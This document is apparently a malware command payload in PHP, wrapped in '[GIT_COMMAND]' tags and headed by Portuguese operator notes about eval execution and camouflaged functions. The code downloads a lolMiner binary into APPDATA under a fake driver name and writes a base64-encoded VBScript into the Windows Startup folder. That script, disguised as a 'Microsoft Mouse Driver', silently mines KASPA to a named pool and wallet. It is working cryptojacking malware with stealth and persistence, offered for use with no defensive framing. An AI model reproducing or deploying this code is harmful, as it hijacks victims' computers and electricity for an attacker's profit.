execução por eval. cuidado, não use exit e nem __FILE__
cuidado ao chamar funções nativas pois elas estao camufladas

[GIT_COMMAND]

$GLOBALS['__download_002'] = function($url)
{
	try
	{
		$header = array(
			'Cache-Control: max-age=0',
			'Connection: keep-alive',
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
		);
		clearstatcache();
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0' );
		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
		curl_setopt($ch, CURLOPT_TIMEOUT, $curlTimeout);
		$response = @curl_exec($ch);
		return $response;
		
	}catch( Exception $e ){}
	return false;
};

$command_id = '000023';
if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
{
	$GLOBALS['BLOG_COMMAND_ID'] = $command_id;
	try{
	$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
	@mkdir($lolm_path);
	$lolm_path .= '\\w_driver_x86.exe';
	$data = true;
	if(!is_file($lolm_path))
	{
		$data = false;
		$data = $GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner.dat');
		if($data && strlen($data) > 7700)
			@file_put_contents($lolm_path, $data);
		else
			$data = false;
	}
	if($data !== false)
	{
		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
		$vbs_checkname = 'Microsoft Mouse Driver x86';
		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
		$command = '"'.$lolm_path.'" --algo KASPA --pool stratum+tcp://pool.br.woolypooly.com:3112 --user kaspa:qzvk2n3wrtej6zy0l7zxc3fhygal25p43f5myeq3jexav7cvj6vxgjjhps66c';
		$command = preg_replace('/\"/is', '""', $command);
		$vbs = base64_decode($vbs);
		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
		if(is_dir($vbs_path))
		{
			$count_files = 0;
			$di = new DirectoryIterator($vbs_path);
			unset($data);
			foreach($di as $data)
			{
				if($data->isDot() || $data->isDir() || !$data->isFile())
					continue;
				if(stripos($data->getFilename(), $vbs_checkname) === false)
					continue;
				$count_files++;
				if($count_files == 1)
					@file_put_contents($data->getPathname(), $vbs);
				else
					@unlink($data->getPathname());
			}
			if($count_files == 0)
				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
		}
	}
	}catch(Exception $e){}
}

[/GIT_COMMAND]
